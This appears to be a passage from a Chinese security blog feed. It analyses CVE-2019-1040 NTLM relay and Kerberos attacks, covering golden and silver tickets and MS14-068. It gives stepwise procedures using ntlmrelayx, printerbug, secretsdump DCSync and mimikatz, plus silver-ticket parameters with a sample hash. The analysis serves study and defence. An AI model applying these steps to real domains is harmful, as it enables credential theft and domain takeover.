id="CVE-2019-1040分析"><a href="#CVE-2019-1040分析" class="headerlink" title="CVE-2019-1040分析"></a>CVE-2019-1040分析</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>如果Exchange等Windows服务器可以向我们进行身份验证，并通过LDAP将该身份验证中继到域控制器，则可以获得受害者的权限并在Active Directory中执行各种操作。Exchange服务器一般拥有较高权限，这导致攻击者拥有足够高的权限来授予自己DCSync权限，这是PrivExchange漏洞产生的原因。<br><strong>SpoolService/printer bug</strong><br>在攻击利用流程中，需要使用到一个名为printerbug.py的工具，此工具触发SpoolService/printer bug，强制打印服务器通过MS-RPRN RPC接口向攻击者进行身份验证。<br>Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。<br>任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。另外微软表示这个bug是系统设计特点，无需修复。</p><h3 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h3><ol><li>执行ntlmrelayx.py脚本进行NTLM中继攻击，设置SMB服务器并将认证凭据中继到LDAP协议。其中–remove-mic选项用于清除MIC标志，–escalate-user用于提升指定用户权限：<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/5-1.png"></li><li>执行printerbug.py脚本，触发SpoolService的bug。使用SpoolService打印机错误攻击Exchange服务器，并触发SpoolService漏洞，使打印服务器向我们进行身份认证：<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/5-2.png"></li><li>SpoolService的bug导致Exchange服务器回连到ntlmrelayx.py，即将认证信息发送到ntlmrelayx.py。可以在下图中看到认证用户是TEST\TOPSEC$。<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/5-3.png"></li><li>接着ntlmrelayx.py开始执行LDAP攻击，加上-debug选项后可以看到更详细的信息。它会通过遍历验证中继帐户所在用户组及权限，发现当前账户可以创建用户、可以修改test.local域的ACL，因为域中的Exchange Windows Permissions用户组被允许修改ACL。因此脚本会首选修改ACL来提权，因为这相比创建用户的方式更隐秘一些。具体方式是通过LDAP修改域的安全描述符（Security Descriptor），可以在下面的数据包中看到ACL中每一条具体的访问控制条目（ACE，Access Control Entries）：<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/5-4.png"><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/5-5.png"></li><li>完成ACL的修改后，test就可以通过secretsdump.py的DCSync功能dump出所有密码哈希值：<br>通过 secretsdump.py 的DCSync功能dump出所有密码哈希值：<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/5-6.png"></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;什么是NTLM中继攻击&quot;&gt;&lt;a href=&quot;#什么是NTLM中继攻击&quot; class=&quot;headerlink&quot; title=&quot;什么是NTLM中继攻击&quot;&gt;&lt;/a&gt;什么是NTLM中继攻击&lt;/h2&gt;&lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;NTLM是Windows实现身份认证的一种协议，如计算机A远程登陆计算机B，在计算机B验证计算机A的时候使用的是NTLM协议。但是在这个过程中，计算机A在通常情况下不知道计算机B是不是真正的计算机B，因为攻击机C也可以来冒充计算机B。当攻击机C冒充计算机B后，原本计算机A发往计算机B的NTLM认证流量，将发送给攻击机C，攻击机C接收到认证信息之后，再转发给B，从而实现NTLM流量的中继，也就是平常所说的中间人攻击，NTLM中继也就是中间人攻击的一种。&lt;br&gt;上述过程我们可以将再攻击机C上的中继程序理解为一个NTLM协议代理程序。但是攻击机C怎么实现欺骗计算机A呢，许多网络协议可以用来进行欺骗，从而进行中间人攻击，常见的有ARP、DHCP、DNS等。在实际的攻击中，使用LLMNR/NetBIOSNS欺骗的方式更多，因为这类欺骗的网络流量小，实施也更容易，与Net-NTLMhash relay attack的结合也更紧密。&lt;br&gt;LLMNR和NetBIOSNS是Windows系统完成名称解析的一种方法。&lt;br&gt;&lt;strong&gt;Windows系统对机器名的解析顺序如下：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;本地HOSTS文件（%windir%\System32\drivers\etc\hosts）&lt;/li&gt;
&lt;li&gt;DNS缓存&lt;/li&gt;
&lt;li&gt;DNS服务器&lt;/li&gt;
&lt;li&gt;链路本地多播名称解析（LLMNR）&lt;/li&gt;
&lt;li&gt;NetBIOS名称服务（NBT-NS）&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;参考文档&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;LLMNR协议&quot;&gt;&lt;a href=&quot;#LLMNR协议&quot; class=&quot;headerlink&quot; title=&quot;LLMNR协议&quot;&gt;&lt;/a&gt;LLMNR协议&lt;/h3&gt;&lt;p&gt;在DNS 服务器不可用时，DNS 客户端计算机可以使用本地链路多播名称解析 (LLMNR—Link-Local Multicast Name Resolution)（也称为多播 DNS 或 mDNS）来解析本地网段上的名称。例如，如果路由器出现故障，从网络上的所有 DNS 服务器切断了子网，则支持 LLMNR 的子网上的客户端可以继续在对等基础上解析名称，直到网络连接还原为止。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://lahonja.me/categories/内网渗透/"/>
    
    
    <category term="Windows" scheme="http://lahonja.me/tags/Windows/"/>
    
    <category term="漏洞分析" scheme="http://lahonja.me/tags/漏洞分析/"/>
    
    <category term="协议分析" scheme="http://lahonja.me/tags/协议分析/"/>
    
  </entry>
  
  <entry>
    <title>结合ms14068对kerberos协议分析</title>
    <link href="http://lahonja.me/2019/08/05/%E7%BB%93%E5%90%88ms14068%E5%AF%B9kerberos%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    <id>http://lahonja.me/2019/08/05/%E7%BB%93%E5%90%88ms14068%E5%AF%B9kerberos%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/</id>
    <published>2019-08-05T06:14:23.000Z</published>
    <updated>2019-08-08T01:13:07.897Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kerberos协议介绍"><a href="#Kerberos协议介绍" class="headerlink" title="Kerberos协议介绍"></a>Kerberos协议介绍</h2><h3 id="什么是SSPI"><a href="#什么是SSPI" class="headerlink" title="什么是SSPI"></a>什么是SSPI</h3><p>&emsp;安全支持提供者接口（英语：Security Support Provider Interface，缩写SSPI）是Microsoft Windows操作系统中用于执行各种安全相关操作（如身份验证）的一个Win32 API。<br>&emsp;SSPI的功能是作为众多安全支持提供程序（SSP）的通用接口：安全支持提供者（Security Support Provider）是可以为应用程序提供一种或多种安全功能包的动态链接库（dynamic-link library）。</p><h3 id="Windows常用的SSP"><a href="#Windows常用的SSP" class="headerlink" title="Windows常用的SSP"></a>Windows常用的SSP</h3><ul><li>NTLM（Windows NT 3.51中引入）(msv1_0.dll) - 为Windows 2000之前的客户端-服务器域和非域身份验证（SMB/CIFS）提供NTLM质询/响应身份验证。</li><li>Kerberos（Windows 2000中引入，Windows Vista中更新为支持AES）(kerberos.dll) - Windows 2000及更高版本中首选的客户端-服务器域相互身份验证。</li><li>Negotiate（Windows 2000中引入）(secur32.dll) - Negotiate安全包在Kerberos和NTLM之间进行选择协商选择。Negotiate默认使用Kerberos，当Kerberos不能被身份验证中涉及的某个系统使用时，将使用NTLM。</li><li>摘要SSP（Windows XP中引入）(wdigest.dll) - 在Windows与Kerberos不可用的非Windows系统间提供基于HTTP和SASL身份验证的质询/响应。</li><li>凭据 (CredSSP)（Windows Vista中引入，Windows XP SP3上也可用）(credssp.dll) - 为远程桌面连接提供单点登录（SSO）和网络级身份验证。<a id="more"></a><blockquote><p>参考： <a href="https://zh.wikipedia.org/wiki/SSPI" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/SSPI</a></p></blockquote></li></ul><h3 id="Kerberos形象化理解"><a href="#Kerberos形象化理解" class="headerlink" title="Kerberos形象化理解"></a>Kerberos形象化理解</h3><p>&emsp;Kerberos协议中主要涉及到Client、AS（也被称为KDC）、TGS、SS。我们形象化到我们的生活中，可以分别理解为4个主体：张三（Client）、公安局（AS）、房管局（TGS）、售楼部（SS）。<br>&emsp;这里以买房子为例，张三到售楼部买房子，但是售楼部是需要张三提供房管局签发的允许购房证明；张三到了房管局，但是房管局为了确认张三的身份，需要张三到公安局开一张个人身份证明（ <strong>公安局为了这个证明不用做其他用途，将这个证明加了密的，只有公安局能够解开；想要查验这个证明是否有效，需要房管局向公安局查验</strong> ）。当然上述流程是一个逆向去开证明的流程，为了不多跑路，这个流程一开始就是公开的。所以正常的步骤应该是：</p><ol><li>张三到公安局开身份证明（Client-&gt;AS）</li><li>公安局给张三签发只公安局能看懂的身份证明（AS-&gt;Client，TGT票据）</li><li>张三拿着公安局给的证明去房管局开允许购房证明 （Client-&gt;TGS）</li><li>房管局给张三签发只有房管局能看懂的允许购房证明 （TGS-&gt;Client，ST票据）</li><li>张三拿着房管局的允许购房证明去售楼部买房（Client-&gt;SS）</li><li>售楼部向房管局查验证明通过后，张三就可以买房了（SS-&gt;Client）</li></ol><h3 id="Kerberos协议具体介绍"><a href="#Kerberos协议具体介绍" class="headerlink" title="Kerberos协议具体介绍"></a>Kerberos协议具体介绍</h3><p>&emsp;Authentication Server： AS的作用就是验证Client端的身份（确定你是身份证上的本人），验证通过就会给一张TGT（Ticket Granting Ticket）票给Client。<br>&emsp;Ticket Granting Server： TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（ST）。ST（Service Ticket）也有资料称为TGS Ticket。<br>&emsp;名词解析：</p><ul><li>KDC(Key Distribution Center):密钥分发中心，里面包含两个服务：AS和TGS</li><li>AS(Authentication Server):身份认证服务</li><li>TGS(Ticket Granting Server):票据授予服务,该服务提供的票据也称为 TGS 或者叫白银票据，也被称为ST。</li><li>TGT(Ticket Granting Ticket):由身份认证服务授予的票据(黄金票据)，用于身份认证，存储在内存，默认有效期为10小时<img src="/2019/08/05/结合ms14068对kerberos协议分析/2-1.png"></li></ul><p>&emsp;Kerberos认证流程简化如下（<a href="https://medium.com/@robert.broeckelmann/kerberos-wireshark-captures-a-windows-login-example-151fabf3375a" target="_blank" rel="noopener">具体数据包解析传送门</a>）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">1. KRB_AS_REQ</span><br><span class="line">   <span class="built_in"> Client </span>-&gt; Server(AS) 认证服务</span><br><span class="line">    Message0: </span><br><span class="line">        加密: client_secret_key</span><br><span class="line">        数据: Realm,principal,IP,Pre-authentication data<span class="built_in">..</span>.</span><br><span class="line">        </span><br><span class="line">2. KRB_AS_RSP</span><br><span class="line">    Server(AS) 认证服务 -&gt; Client</span><br><span class="line">    Message1: </span><br><span class="line">        加密: client_secret_key</span><br><span class="line">        数据: TGS name,TGS_session_key</span><br><span class="line">    Message2(访问TGS的票据TGT): Client解密不了</span><br><span class="line">        加密: TGS_secret_key(krbtgt_hash)</span><br><span class="line">        数据: Username,TGS Name,TGS_session_key<span class="built_in">..</span>.</span><br><span class="line">        </span><br><span class="line">3. KRB_TGS_REQ</span><br><span class="line">   <span class="built_in"> Client </span>-&gt; Server(TGS) 票据授权服务</span><br><span class="line">    Message3: Client解密不了</span><br><span class="line">        加密: 由上一步服务端使用 TGS_secret_key(krbtgt_hash) 加密</span><br><span class="line">        数据: 直接转发Message2(访问TGS的票据TGT)</span><br><span class="line">    Message4:</span><br><span class="line">        加密: TGS_session_key</span><br><span class="line">        数据: authenticator</span><br><span class="line">        </span><br><span class="line">4. KRB_TGS_RSP</span><br><span class="line">    Server(TGS) 认证服务 -&gt; Client</span><br><span class="line">    Message5(访问SS的票据ST): Client解密不了</span><br><span class="line">        加密: Service_Secret_Key</span><br><span class="line">        数据: Service_Session_Key</span><br><span class="line">    Message6:</span><br><span class="line">        加密: TGS_session_key</span><br><span class="line">        数据: Service_Session_Key</span><br><span class="line">        </span><br><span class="line">5. KRB_AP_REQ</span><br><span class="line">   <span class="built_in"> Client </span>-&gt; Server(SS) 应用服务</span><br><span class="line">    Message5(访问SS的票据ST): Client解密不了</span><br><span class="line">        加密: Service_Secret_Key</span><br><span class="line">        数据: Username,Service Name,Service_Session_Key</span><br><span class="line">    Message7:</span><br><span class="line">        加密: Service_Session_Key</span><br><span class="line">        数据: authenticator</span><br><span class="line">        </span><br><span class="line">6. KRB_AP_RSP</span><br><span class="line">    Server(SS) 应用服务 -&gt; Client</span><br><span class="line">    Message8:</span><br><span class="line">        加密方式: Service_Session_Key</span><br><span class="line">        数据: authenticator</span><br></pre></td></tr></table></figure><p>下面是三张详细的Kerberos认证过程流程图：</p><img src="/2019/08/05/结合ms14068对kerberos协议分析/1.jpeg"><img src="/2019/08/05/结合ms14068对kerberos协议分析/2.png"><img src="/2019/08/05/结合ms14068对kerberos协议分析/kerberos_detail.png"><h3 id="Kerberos拓展阅读"><a href="#Kerberos拓展阅读" class="headerlink" title="Kerberos拓展阅读"></a>Kerberos拓展阅读</h3><ul><li><a href="https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#top-level-pac-structure" target="_blank" rel="noopener">PAC数据结构</a></li><li><a href="https://blogs.technet.microsoft.com/apgceps/2011/09/12/packerberos-2/" target="_blank" rel="noopener">PAC在Kerberos认证协议中的作用（一）</a></li><li><a href="https://blogs.technet.microsoft.com/apgceps/2011/09/19/packerberos/" target="_blank" rel="noopener">PAC在Kerberos认证协议中的作用(二)</a></li><li><a href="https://blogs.msdn.microsoft.com/openspecification/2009/04/24/understanding-microsoft-kerberos-pac-validation/" target="_blank" rel="noopener">了解Microsoft Kerberos PAC验证</a></li><li><a href="https://www.anquanke.com/post/id/172900#h2-1" target="_blank" rel="noopener">Kerberos协议探索系列之票据篇</a></li></ul><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="什么是TGT票据"><a href="#什么是TGT票据" class="headerlink" title="什么是TGT票据"></a>什么是TGT票据</h3><p>&emsp;TGT票据，ticket-granting-tickets，是客户端通过身份认证服务器(AS)的认证之后，AS签发给Client的一个身份票据，可以使用这个凭据访问其他服务（TGS要检查这个TGT是否拥有将要访问服务的权限）。通过windows自带命令<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/klist" target="_blank" rel="noopener">klist</a>，可以查看本机缓存的TGT票据，或者使用<a href="https://gallery.technet.microsoft.com/List-All-Cached-Kerberos-5ba41829" target="_blank" rel="noopener">这个Powershell脚本</a>来查看本机的票据。结果如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Kerberos Tickets <span class="keyword">for</span> LogonID 0x74bba</span><br><span class="line">*****************************</span><br><span class="line">Logon Type: 5</span><br><span class="line">Session ID: 0x74bba</span><br><span class="line">Auth Method: Kerberos</span><br><span class="line">Current LogonId is 0:0x21957b6</span><br><span class="line">Targeted LogonId is 0:0x74bba</span><br><span class="line">Cached TGT:</span><br><span class="line">ServiceName : krbtgt</span><br><span class="line">TargetName (SPN) : krbtgt</span><br><span class="line">ClientName : adfs</span><br><span class="line">DomainName : RCBJ.NET</span><br><span class="line">TargetDomainName : RCBJ.NET</span><br><span class="line">AltTargetDomainName: RCBJ.NET</span><br><span class="line">Ticket Flags : 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize</span><br><span class="line">Session Key : KeyType 0x12 — AES-256-CTS-HMAC-SHA1–96</span><br><span class="line"> : KeyLength 32–25 2b a5 21 cb 56 5f f1 f6 ad e9 35 73 7b 31 06 2e e8 8e 67 f7 bb 9f 24 a7 a5 50 fd</span><br><span class="line">d8 d0 43 48</span><br><span class="line">StartTime : 9/6/2018 23:23:25 (local)</span><br><span class="line">EndTime : 9/7/2018 9:23:25 (local)</span><br><span class="line">RenewUntil : 9/9/2018 2:27:40 (local)</span><br><span class="line">TimeSkew : + 0:00 minute(s)</span><br><span class="line">EncodedTticket : (size: 1003)</span><br><span class="line">0000 61 82 03 e7 30 82 03 e3:a0 03 02 01 05 a1 0a 1b a…0………<span class="built_in">..</span></span><br><span class="line">0010 08 52 43 42 4a 2e 4e 45:54 a2 1d 30 1b a0 03 02 .RCBJ.NET<span class="built_in">..</span>0….</span><br><span class="line">0020 01 02 a1 14 30 12 1b 06:6b 72 62 74 67 74 1b 08 ….0…krbtgt<span class="built_in">..</span></span><br><span class="line">0030 52 43 42 4a 2e 4e 45 54:a3 82 03 af 30 82 03 ab RCBJ.NET….0…</span><br><span class="line">0040 a0 03 02 01 12 a1 03 02:01 02 a2 82 03 9d 04 82 …………….</span><br><span class="line">0050 03 99 6f 06 82 a8 18 3f:60 c7 b2 b7 2a 2b 18 e5 <span class="built_in">..</span>o….?`…*+<span class="built_in">..</span></span><br><span class="line">Ticket #0 : @&#123;<span class="attribute">Client</span>=adfs @ RCBJ.NET; <span class="attribute">Server</span>=krbtgt/RCBJ.NET @ RCBJ.NET; KerbTicket Encryption</span><br><span class="line"> <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96; Ticket <span class="attribute">Flags</span>=0x40e10000 -&gt; forwardable renewable initial pre_authent</span><br><span class="line"> name_canonicalize ; Start <span class="attribute">Time</span>=9/6/2018 23:23:25 (local); End <span class="attribute">Time</span>=9/7/2018 9:23:25 (local); Renew</span><br><span class="line"> <span class="attribute">Time</span>=9/9/2018 2:27:40 (local); Session Key <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96&#125;</span><br><span class="line">Ticket #1 : @&#123;<span class="attribute">Client</span>=adfs @ RCBJ.NET; <span class="attribute">Server</span>=krbtgt/RCBJ.NET @ RCBJ.NET; KerbTicket Encryption</span><br><span class="line"> <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96; Ticket <span class="attribute">Flags</span>=0x60a10000 -&gt; forwardable forwarded renewable pre_authent</span><br><span class="line"> name_canonicalize ; Start <span class="attribute">Time</span>=9/2/2018 2:27:49 (local); End <span class="attribute">Time</span>=9/2/2018 12:27:40 (local); Renew</span><br><span class="line"> <span class="attribute">Time</span>=9/9/2018 2:27:40 (local); Session Key <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96&#125;</span><br><span class="line">Ticket #2 : @&#123;<span class="attribute">Client</span>=adfs @ RCBJ.NET; <span class="attribute">Server</span>=ldap/EC2AMAZ-A6G81N3.rcbj.net @ RCBJ.NET; KerbTicket Encryption</span><br><span class="line"> <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96; Ticket <span class="attribute">Flags</span>=0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate</span><br><span class="line"> name_canonicalize ; Start <span class="attribute">Time</span>=9/7/2018 1:38:28 (local); End <span class="attribute">Time</span>=9/7/2018 9:23:25 (local); Renew</span><br><span class="line"> <span class="attribute">Time</span>=9/9/2018 2:27:40 (local); Session Key <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96&#125;</span><br><span class="line">Ticket #3 : @&#123;<span class="attribute">Client</span>=adfs @ RCBJ.NET; <span class="attribute">Server</span>=ldap/EC2AMAZ-A6G81N3.rcbj.net/rcbj.net @ RCBJ.NET; KerbTicket Encryption</span><br><span class="line"> <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96; Ticket <span class="attribute">Flags</span>=0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate</span><br><span class="line"> name_canonicalize ; Start <span class="attribute">Time</span>=9/6/2018 23:28:02 (local); End <span class="attribute">Time</span>=9/7/2018 9:23:25 (local); Renew</span><br><span class="line"> <span class="attribute">Time</span>=9/9/2018 2:27:40 (local); Session Key <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96&#125;</span><br></pre></td></tr></table></figure><h3 id="黄金票据原理"><a href="#黄金票据原理" class="headerlink" title="黄金票据原理"></a>黄金票据原理</h3><p>&emsp;<strong>黄金票据的漏洞主要出现在kerberos认证过程中的KRB_TGS_REQ请求过程中，我们如果拥有krbtgt账号的密码哈希，我们则可以伪造成域内的任意用户。</strong><br>&emsp;Golden Ticket（下面称为黄金票据）是伪造的TGT（Ticket Granting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。通过前面的分析，认识到TGT是AS签发给Client的，并且是使用AS的用户密码hash进行加密（在域中默认为krbtgt）；所以只要知道了krbtgt账号密码的hash，就可以进行任意票据伪造。<br>&emsp;当用户与AS(KDC)之间完成了认证过程之后， Client需要访问Server所提供的某项服务时， Server为了判断用户是否具有合法的权限需要将Client的User SID等信息传递给AS(KDC)， AS(KDC)通过SID判断用户的用户组信息， 用户权限等， 进而将结果返回给Server， Server再将此信息与用户所索取的资源的ACL进行比较， 最后决定是否给用户提供相应的服务。<br>&emsp;认识了上述票据的权限认证原理后，我们知道票据的权限主要是取决于票据中保存的用户的SID，因为AS判断权限时，时通过票据中用户的SID进行判断的。SID的末尾为RID，是域用户的唯一对象标识。<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab" target="_blank" rel="noopener">点击这里查看常见SID含义</a>。</p><ul><li>ADMINISTRATOR SID：S-1-5-21 <domainid> -500</domainid></li><li>管理员组：S-1-5-21-DOMAINID-513</li><li>域用户SID：S-1-5-21-DOMAINID-513</li><li>域管理员SID：S-1-5-21-DOMAINID-512</li><li>架构管理员SID：S-1-5-21-DOMAINID-518</li><li>企业管理员SID：S-1-5-21-DOMAINID-519（只有在森林根域中创建伪造票证时才有效，但为AD森林管理员权限添加使用/ sids参数）</li><li>组策略创建者所有者SID：S-1-5-21 <domainid> -520</domainid></li></ul><h3 id="黄金票据利用条件"><a href="#黄金票据利用条件" class="headerlink" title="黄金票据利用条件"></a>黄金票据利用条件</h3><ul><li>域名称</li><li>域SID值，注意是去掉最后一个-后面的值</li><li>域KRBTGT账户密码HASH</li><li>伪造用户名，可以是任意的</li></ul><h3 id="黄金票据利用过程"><a href="#黄金票据利用过程" class="headerlink" title="黄金票据利用过程"></a>黄金票据利用过程</h3><ol><li>使用mimikatz抓取krbtgt用户的密码HASH及域SID<img src="/2019/08/05/结合ms14068对kerberos协议分析/3-1.png"></li><li>使用mimikatz伪造票据并注入到session<img src="/2019/08/05/结合ms14068对kerberos协议分析/3-2.png"></li><li>查看当前Session的权限<img src="/2019/08/05/结合ms14068对kerberos协议分析/3-3.png"></li><li>使用psexec在DC上执行命令<img src="/2019/08/05/结合ms14068对kerberos协议分析/3-4.png"></li></ol><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><h3 id="白银票据原理"><a href="#白银票据原理" class="headerlink" title="白银票据原理"></a>白银票据原理</h3><p><strong>白银票据的漏洞主要出现在kerberos认证过程中的KRB_AP_REQ请求过程中，我们如果拥有ServiceAccount账号的密码哈希，我们则可以域内的任意用户去访问对应的服务。</strong><br>白银票据(Silver Tickets)是伪造Kerberos中授予访问服务（Service Ticket）的票据（服务票据，简称ST）。使用服务票据可以直接访问服务，与域控制器没有KRB_AS_REQ/KRB_AS_REP，也没有KRB_TGS_REQ/KRB_TGS_REP通信。由于银票是伪造的ST，所以没有与域控制器通信。</p><h3 id="白银票据的特点"><a href="#白银票据的特点" class="headerlink" title="白银票据的特点"></a>白银票据的特点</h3><p>1.白银票据是一个有效的服务票据（ST），因为Kerberos验证服务票据是通过服务帐户密码哈希进行加密和签名的。<br>2.黄金票据是伪造TGT，从而可以访问任意计算机和服务。而白银票据是伪造ST。这意味着白银票据只能访问特定服务器上的任何服务。<br>3.大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效ST可以完全伪造PAC。<br>4.攻击者需要服务帐户密码哈希值。<br>5.TGS是伪造的，所以没有和TGT通信，意味着绕过DC的身份验证。<br>6.任何事件日志都在目标服务器上。</p><h3 id="白银票据利用条件"><a href="#白银票据利用条件" class="headerlink" title="白银票据利用条件"></a>白银票据利用条件</h3><ul><li>/domain:lab.adsecurity.org 所在域的域名称</li><li>/sid:S-1-5-21-1473643419-774954089-2222329127 所在域的域SID，可通过 lsadump::lsa 获取</li><li>/admin:LukeSkywalker 伪造的账号名称（如： Administrator ）</li><li>/target:adsmswin2k8r2.lab.adsecurity.org 指定要访问的目标服务/计算机的路径</li><li>/service:cifs 要访问的服务名（如cifs,HOST…）</li><li>rc4:d7e2b80507ea074ad59f152a1ba20458 目标计算机账号（机器名$，或对应服务账号，如 MS SQL ）的 Hash<img src="/2019/08/05/结合ms14068对kerberos协议分析/5-0.png"></li></ul><h3 id="白银票据的对应的服务列表"><a href="#白银票据的对应的服务列表" class="headerlink" title="白银票据的对应的服务列表"></a>白银票据的对应的服务列表</h3><table><thead><tr><th align="left">服务类型</th><th align="right">白银票据对应的服务名</th></tr></thead><tbody><tr><td align="left">WMI</td><td align="right">HOST/RPCSS</td></tr><tr><td align="left">PowerShell Remoting</td><td align="right">HOST/HOST</td></tr><tr><td align="left">WinRM</td><td align="right">HOST/HTTP</td></tr><tr><td align="left">Scheduled Tasks</td><td align="right">HOST</td></tr><tr><td align="left">Windows File Share (CIFS)</td><td align="right">CIFS</td></tr><tr><td align="left">LDAP operations including Mimikatz DCSync</td><td align="right">LDAP</td></tr><tr><td align="left">Windows Remote Server Administration Tools</td><td align="right">RPCSS/LDAP/CIFS</td></tr></tbody></table><h3 id="白银票据利用过程"><a href="#白银票据利用过程" class="headerlink" title="白银票据利用过程"></a>白银票据利用过程</h3><p><a href="https://adsecurity.org/?p=2011" target="_blank" rel="noopener">详细利用过程传送门</a></p><ol><li>为”HOST”服务创建白银票据，以获得目标计算机上计划任务的修改和创建计划权限。在创建白银票据中的/service参数为HOST。<img src="/2019/08/05/结合ms14068对kerberos协议分析/5-1.png"></li><li>利用HOST Silver Ticket，我们可以创建一个新的计划任务。<img src="/2019/08/05/结合ms14068对kerberos协议分析/5-2.png"></li></ol><h2 id="ms14068漏洞分析"><a href="#ms14068漏洞分析" class="headerlink" title="ms14068漏洞分析"></a>ms14068漏洞分析</h2><h3 id="什么是PAC"><a href="#什么是PAC" class="headerlink" title="什么是PAC"></a>什么是PAC</h3><p>&emsp;PAC的全称是Privilege Attribute Certificate(特权属性证书)， 其中所包含的是各种授权信息， 例如用户所属的用户组， 用户所具有的权限等。<br>&emsp;当用户与AS(KDC)之间完成了认证过程之后， 用户需要访问服务器所提供的某项服务时， 服务器为了判断用户是否具有合法的权限，就必须通过将用户的用户名传递给AS(KDC)， AS(KDC)通过得到的用户名查询用户的用户组信息， 用户权限等， 进而返回给服务器， 服务器再将此信息与用户所索取的资源的ACL进行比较， 最后决定是否给用户提供相应的服务。<br>&emsp;上述步骤是，如果没有PAC，则会使客户端访问指定的服务过程中，服务端会多次向AS(KDC)进行身份验证，这也就失去了第一步KRB_AS_REQ的意义。<br>&emsp;为了在授权中不多次进行身份认证，在Windows的Kerberos实现中，使用了PAC，从而只需要在需要身份验证时，去检验PAC的校验是否正确。默认情况下，KRB_AS_REP信息中将包含一组PAC信息， 也就是说， 用户所得到的TGT（TicketGranting 